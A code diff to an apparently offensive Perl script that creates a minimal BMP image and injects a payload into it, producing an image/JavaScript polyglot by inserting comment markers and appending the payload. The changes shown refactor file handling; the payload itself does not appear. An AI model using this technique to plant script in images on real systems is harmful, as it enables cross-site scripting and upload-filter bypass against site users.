@@ -12,6 +12,7 @@ use strict;
 use warnings;
 use feature 'say';
 
+use POSIX;
 use Getopt::Long;
 
 sub usage;
@@ -37,7 +38,6 @@ say <<EOF;
 EOF
 
 create_bmp              unless -f $outfile;
-
 inject_payload;
 
 say `file       $outfile`   if -f '/usr/bin/file';
@@ -65,10 +65,9 @@ sub create_bmp {
         . "\x00\x00\x0c\x00\x00\x00\x01\x00\x01\x00\x01\x00"
         . "\x18\x00\x00\x00\xff\x00";
 
-    open my $fh, '>', $outfile or die;
-    binmode $fh;
-    print   $fh  $bmp_minimal;
-    close   $fh;
+    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
+    syswrite   $fh, $bmp_minimal;
+    close      $fh;
 
     say "[✔] File saved to: $outfile\n";
 }
@@ -76,11 +75,11 @@ sub create_bmp {
 sub inject_payload {
     say "[>] Injecting payload into $outfile";
 
-    sysopen my $fh, $outfile, 1 or die;
-    sysseek    $fh, 2, 0;
+    sysopen my $fh, $outfile, O_RDWR;
+    sysseek    $fh, 2, SEEK_SET;
 
     syswrite   $fh, "\x2f\x2a";
-    sysseek    $fh, 0, 2;
+    sysseek    $fh, 0, SEEK_END;
     
     syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
     syswrite   $fh, $payload;
